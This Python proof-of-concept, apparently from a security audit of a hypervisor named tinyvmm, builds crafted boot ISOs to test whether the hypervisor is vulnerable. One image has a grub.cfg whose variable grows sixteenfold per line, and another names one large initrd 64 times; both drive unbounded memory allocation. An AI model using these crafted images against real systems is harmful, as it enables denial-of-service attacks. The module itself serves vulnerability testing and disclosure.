"""PoC, finding 6: a boot image's grub.cfg makes tinyvmm allocate without bound
before any VM exists.

An ISO whose `boot/grub/grub.cfg` grows a variable sixteenfold per line
(`set a=$a$a...`) is booted with `--iso`. A vulnerable build expands the
variable until the allocation fails (under the memory cap this PoC runs it
with: 16 TiB otherwise) and dies; a fixed build refuses the configuration by
name. A second image names one initrd sixty-four times.
"""
from pathlib import Path

from .common import REPO, build_iso, run_capped

CAP = 6 << 30  # per-process commit cap while the PoC runs


def run(exe: Path, work: Path) -> dict:
    work.mkdir(parents=True, exist_ok=True)
    kernel = (REPO / "vmlinux").read_bytes()[:4096]  # never loaded: the config fails or blows up first
    grow = "set a=" + "$a" * 16 + "\n"
    cfg = "set a=" + "A" * 16 + "\n" + grow * 11 + "menuentry bomb {\n linux /k $a\n}\n"
    iso = work / "grub-bomb.iso"
    iso.write_bytes(build_iso({"boot": {"grub": {"grub.cfg": cfg.encode()}}, "k": kernel}))
    r = run_capped([exe, "--pvh-run", "--iso", iso, "--ram-mb", "256", "--watchdog-secs", "20"],
                   timeout=120, memory_limit=CAP)
    refused = "too large" in r.output and "grub.cfg" in r.output
    vulnerable = not refused
    evidence = (f"peak commit {r.peak_commit / (1 << 20):.0f} MiB, {r.seconds:.1f} s, exit code "
                f"{r.rc if r.rc is None or r.rc >= 0 else hex(r.rc & 0xFFFFFFFF)}"
                f"{', killed at the timeout' if r.timed_out else ''}; last line: "
                f"{(r.output.strip().splitlines() or [''])[-1][:160]!r}")
    # A second image: one small initrd named 64 times (each 32 MiB here).
    initrd = bytes(32 << 20)
    cfg2 = "menuentry many {\n linux /k\n initrd" + " /z" * 64 + "\n}\n"
    iso2 = work / "initrd-bomb.iso"
    iso2.write_bytes(build_iso({"boot": {"grub": {"grub.cfg": cfg2.encode()}}, "k": kernel, "z": initrd}))
    r2 = run_capped([exe, "--pvh-run", "--iso", iso2, "--ram-mb", "256", "--watchdog-secs", "20"],
                    timeout=120, memory_limit=CAP)
    refused2 = "initrds is too large" in r2.output
    evidence2 = (f"64x one 32 MiB initrd: peak commit {r2.peak_commit / (1 << 20):.0f} MiB, "
                 f"{'refused by name' if refused2 else 'read them all'}")
    for f in (iso, iso2):
        f.unlink(missing_ok=True)
    return {"vulnerable": vulnerable or not refused2, "evidence": evidence + "; " + evidence2}
